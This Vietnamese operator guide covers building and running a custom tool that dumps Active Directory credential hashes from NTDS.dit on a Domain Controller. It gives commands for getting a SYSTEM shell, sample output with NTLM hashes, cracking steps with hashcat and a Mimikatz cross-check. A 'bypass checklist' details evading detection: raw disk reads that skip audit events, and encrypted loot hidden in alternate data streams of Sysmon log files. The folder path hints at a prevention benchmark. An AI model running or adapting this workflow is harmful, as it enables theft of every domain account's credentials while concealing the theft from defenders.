# Plan 4 — NTDS.dit Dump: Hướng dẫn Setup & Chạy thử

> **Target**: T1003.003 — NTDS.dit (Active Directory Database)
> **Phương pháp**: Raw NTFS Volume Read + Offline ESE Parse
> **Yêu cầu**: SYSTEM trên Domain Controller

---

## 1. Yêu cầu môi trường

| Thành phần | Yêu cầu |
|------------|---------|
| **OS (target)** | Windows Server 2016/2019/2022 (Domain Controller) |
| **Domain** | Active Directory domain (functional level 2016+) |
| **Quyền** | SYSTEM (chạy trực tiếp trên DC) |
| **Disk** | NTFS filesystem, ổ C: (raw volume access required) |
| **Compiler** | Visual Studio 2022 + Windows SDK 10.0.22621+ |
| **Python** | 3.8+ (cho verify script) |

## 2. Cài đặt môi trường build

### 2.1 Visual Studio 2022

```powershell
winget install Microsoft.VisualStudio.2022.BuildTools --override `
    "--add Microsoft.VisualStudio.Workload.VCTools `
     --add Microsoft.VisualStudio.Component.Windows11SDK.22621 `
     --includeRecommended"
```

### 2.2 Kiểm tra DC

```powershell
# Xác nhận đây là Domain Controller
Get-Service -Name NTDS -ErrorAction SilentlyContinue
# Nếu output hiển thị service NTDS → OK

# Xác nhận NTDS.dit tồn tại
Get-Item "$env:SystemRoot\NTDS\ntds.dit"
# Output: file size ~ vài chục MB đến vài GB
```

---

## 3. Build

### 3.1 Build tự động

```powershell
cd D:\2026\Benchmark_Q3\Prvention\OS_dump\Plan4_NTDS
.\build.bat
```

Output: `NTDSDump.exe`

### 3.2 Build thủ công

```powershell
& "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

cl.exe /nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 `
    /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE" `
    /Fe"NTDSDump.exe" `
    src\main.c src\ntfs_raw.c src\mft_parser.c `
    src\hive_extractor.c src\ese_parser.c src\ese_page.c `
    src\ntds_columns.c src\ntds_decrypt.c src\syskey_extract.c `
    src\link_table.c src\ads_writer.c src\cleanup.c `
    src\crypto\sha256.c src\crypto\md5.c `
    src\crypto\rc4.c src\crypto\aes256_gcm.c `
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT `
    kernel32.lib ntdll.lib advapi32.lib
```

---

## 4. Setup môi trường test

### 4.1 Tạo Domain Controller (Lab)

```powershell
# Trên Windows Server 2022:
# 1. Cài AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# 2. Promote thành DC
Install-ADDSForest -DomainName "testlab.local" -SafeModeAdministratorPassword `
    (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -Force

# 3. Tạo test users (50 users)
for ($i = 1; $i -le 50; $i++) {
    $pass = ConvertTo-SecureString "TestP@ss$i!" -AsPlainText -Force
    New-ADUser -Name "TestUser$i" -SamAccountName "testuser$i" `
        -UserPrincipalName "testuser$i@testlab.local" `
        -AccountPassword $pass -Enabled $true -Path "CN=Users,DC=testlab,DC=local"
}

# 4. Tạo computer accounts (simulate domain-joined workstations)
for ($i = 1; $i -le 10; $i++) {
    New-ADComputer -Name "WS$('{0:D2}' -f $i)" -Path "CN=Computers,DC=testlab,DC=local"
}
```

### 4.2 Lấy SYSTEM shell

```powershell
# Cách 1: PsExec (phổ biến nhất)
PsExec64.exe -s -i cmd.exe

# Cách 2: Scheduled Task
schtasks /create /tn "SysShell" /tr "cmd.exe" /sc once /st 00:00 /ru SYSTEM
schtasks /run /tn "SysShell"

# Cách 3: Service (PowerShell)
New-Service -Name "SysShell" -BinaryPathName "cmd.exe /c start cmd.exe" `
    -DisplayName "System Shell" -StartupType Manual
Start-Service -Name SysShell
```

### 4.3 Kiểm tra môi trường

```powershell
# Trong SYSTEM shell:
whoami
# Output: nt authority\system

# Kiểm tra NTDS.dit path từ registry
reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "DSA Working Directory"

# Kiểm tra file lock (bình thường NTDS.dit bị LSASS lock exclusive)
# Không thể mở bằng Notepad hoặc copy bình thường
```

---

## 5. Chạy thử

### 5.1 Dump qua raw NTFS (mặc định)

```powershell
# Trên DC, chạy dưới SYSTEM:
.\NTDSDump.exe
```

Output mong đợi:
```
==========================================================
  NTDS.dit Dump Tool — T1003.003
  Method: Raw NTFS Volume Read + Offline ESE Parse
==========================================================

[1/6] Locating NTDS.dit path... C:\Windows\NTDS\ntds.dit
[2/6] Extracting NTDS.dit + SYSTEM via raw NTFS...
      NTFS: 512 bytes/sector, 8 sectors/cluster, cluster=4096 bytes
      MFT: 134217728 bytes read
      NTDS.dit: OK (48.50 MB)
      SYSTEM:   OK (16777216 bytes)
[3/6] Extracting SysKey from SYSTEM hive... OK (A1B2C3D4E5F60718293A4B5C6D7E8F90)
[4/6] Parsing ESE database (this may take a while for large domains)...
      ESE: pageSize=8192 totalPages=6212 databaseSize=48.50 MB
      Data pages: 4102 | Rows processed: 3950
      Found: 62 users | 10 computers | 1 trusts
      Resolving group memberships...
      Resolved 85 group memberships
[5/6] Encrypting + writing output to ADS...
      Serialized: 24576 bytes
      Encrypted payload: 24604 bytes (AES-256-GCM)
      ADS written: C:\Windows\System32\winevt\Logs\...\Sysmon.evtx:NTDS
[6/6] Cleanup... OK

==========================================================
  NTDS Dump Complete
  Domain: DC=testlab,DC=local
  Users:     62
  Computers: 10
  Trusts:    1
  Groups:    85
==========================================================
```

### 5.2 Dump với NTDSUtil fallback

```powershell
# Khi raw NTFS bị chặn hoặc không khả dụng:
.\NTDSDump.exe --fallback
```

### 5.3 Xem help

```powershell
.\NTDSDump.exe --help
```

---

## 6. Verify kết quả

### 6.1 Đọc ADS output

```powershell
# Đọc ADS stream (Base64 encoded)
$adsContent = Get-Content "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx:NTDS" -Raw
Write-Host "ADS size: $($adsContent.Length) bytes"
```

### 6.2 Chạy verify script (Python)

```powershell
cd test
python verify_ntds.py
```

Output:
```
============================================================
  NTDS.dit Output Verifier — Plan 4
============================================================

[+] Found ADS: ...Sysmon.evtx:NTDS (24604 bytes)
  Nonce: a1b2c3d4e5f6a7b8c9d0
  Tag: 0123456789abcdef...

[+] Decryption SUCCESS
  Format version: 1
  Domain NC: DC=testlab,DC=local
  Users: 62 | Computers: 10 | Trusts: 1
    Administrator:500:AAD3B435B51404EEAAD3B435B51404EE...
    testuser1:1104:ABC123...
    ...

============================================================
  VERIFIED: 62 users extracted
============================================================
```

### 6.3 So sánh với DCSync (cross-check)

```powershell
# Trên DC, chạy Mimikatz DCSync để cross-check NTLM hashes:
# mimikatz # lsadump::dcsync /domain:testlab.local /all /csv

# So sánh NTLM hash của từng user
```

### 6.4 Crack với hashcat

```powershell
# File hashcat được verify script tạo ra
cd test
hashcat -m 1000 ntds_hashes.hashcat wordlist.txt --force
```

### 6.5 Kiểm tra Kerberos keys

```powershell
# Trên DC:
Get-ADUser -Identity "testuser1" -Properties KerberosEncryptionType
# Kiểm tra các key types: AES256=18, AES128=17, RC4=23, DES=1
```

---

## 7. Chạy test script tự động

```powershell
cd test

# Test raw NTFS mode:
.\run_test.ps1

# Test NTDSUtil fallback mode:
.\run_test.ps1 -Fallback

# Skip EDR detection check:
.\run_test.ps1 -SkipDetect
```

---

## 8. Cleanup

```powershell
# Xóa ADS entries
$targets = @(
    "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx",
    "C:\Windows\System32\winevt\Logs\Application.evtx",
    "C:\Windows\System32\LogFiles\HTTPERR\httperr1.log"
)
foreach ($t in $targets) {
    Remove-Item "$t`:NTDS" -Force -EA SilentlyContinue
}

# Xóa snapshot (nếu dùng --fallback)
# ntdsutil snapshot "delete {GUID}" "quit" "quit"

# Xóa output files từ test
Remove-Item .\test\*.hashcat -Force -EA SilentlyContinue
Remove-Item .\output\* -Force -EA SilentlyContinue
```

---

## 9. Troubleshooting

| Lỗi | Nguyên nhân | Cách fix |
|-----|-------------|----------|
| `Volume open FAILED` | Không chạy dưới SYSTEM | Kiểm tra `whoami` → cần `nt authority\system` |
| `Not NTFS filesystem` | Boot sector không phải NTFS | Kiểm tra ổ C: là NTFS |
| `MFT record 0 not valid` | MFT corrupted hoặc bị bảo vệ | Thử `--fallback` |
| `NTDS.dit: FAILED` | Không tìm thấy file trong MFT | Kiểm tra path NTDS.dit; thử `--fallback` |
| `Cannot extract SYSTEM hive` | SYSTEM hive bị lock | Thử copy sang path khác trước |
| `No ESE signature found` | File không phải ESE database | NTDS.dit có thể bị corrupt |
| `DB State: 6 (ForceDetach)` | NTDS.dit đang dirty (DC đang chạy) | Bình thường — vẫn parse được |
| `ESE parse failed` | Cấu trúc database không tương thích | Thử `--fallback` để copy file snapshot |
| `ADS write failed` | File target không tồn tại | Kiểm tra path file evtx |
| `ntdsutil snapshot failed` | VSS writer không hoạt động | Kiểm tra `vssadmin list writers` |

---

## 10. Bypass Verification Checklist

- [ ] **Không file API đến NTDS.dit**: Không gọi `CreateFileW("ntds.dit")` — dùng raw NTFS `\\.\C:`
- [ ] **Không VSS**: Không tạo Volume Shadow Copy (trừ `--fallback` mode chỉ dùng khi cần)
- [ ] **Không ntdsutil.exe**: (trừ `--fallback` mode) — mặc định bypass hoàn toàn
- [ ] **Raw volume bypass SACL**: Đọc trực tiếp từ clusters → không trigger Event 4663
- [ ] **Offline ESE parse**: Parse database trong memory, không mở file
- [ ] **Không file mới trên disk**: Output ghi vào ADS trên file hệ thống có sẵn
- [ ] **AES-256-GCM encryption**: Output mã hóa, không plaintext
- [ ] **Volume I/O jitter**: (Future) Phân tán thời gian đọc cluster để tránh anomaly detection
- [ ] **Không Event 4662 (Directory Service Access)**: Không liên quan DCSync — đọc database offline
- [ ] **Cross-check hashes**: NTLM hashes khớp 100% với DCSync output

---

## 11. Kiến trúc hệ thống

```
┌─────────────────────────────────────────────────────────────┐
│                     NTDSDump.exe (SYSTEM)                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐ │
│  │ Find     │   │ Raw NTFS │   │ Extract  │   │ Parse    │ │
│  │ NTDS Path│──▶│ \\.\C:   │──▶│ SysKey   │──▶│ ESE DB   │ │
│  │ Registry │   │ MFT Walk │   │ SYSTEM   │   │ Columns  │ │
│  └──────────┘   └──────────┘   └──────────┘   └──────────┘ │
│                                                       │      │
│  ┌──────────┐   ┌──────────┐   ┌──────────┐          │      │
│  │ ADS      │◀──│ AES-256  │◀──│ Serialize│◀─────────┘      │
│  │ Output   │   │ GCM Enc  │   │ JSON/Bin │                  │
│  └──────────┘   └──────────┘   └──────────┘                  │
│                                                              │
│  Fallback:                                                   │
│  ┌──────────┐   ┌──────────┐   ┌──────────┐                │
│  │ ntdsutil │──▶│ VSS      │──▶│ Copy from│                │
│  │ snapshot │   │ Snapshot │   │ Mount    │                │
│  └──────────┘   └──────────┘   └──────────┘                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### ESE Database Structure (NTDS.dit)

```
ESE Database:
├── Header Page (Page 0)
│   ├── Magic: 0x89ABCDEF
│   ├── Page Size: 8192 (typical)
│   └── DB State: Clean Shutdown / Dirty
│
├── MSysObjects (Catalog Table)
│   ├── "datatable" → ObjidTable=1
│   └── "link_table" → ObjidTable=2
│
├── datatable (Main AD Objects)
│   ├── Columns:
│   │   ├── ATTj589832: sAMAccountName
│   │   ├── ATTr589970: objectSid (→ RID)
│   │   ├── ATTm590045: unicodePwd (NTLM hash)
│   │   ├── ATTk589826: supplementalCredentials (Kerberos keys)
│   │   ├── ATTj589876: userAccountControl
│   │   └── ATTk589914: pwdHistory
│   └── Rows per user/computer/trust
│
└── link_table (Group Memberships)
    ├── backlink_dnt → member object
    └── link_dnt → group object
```
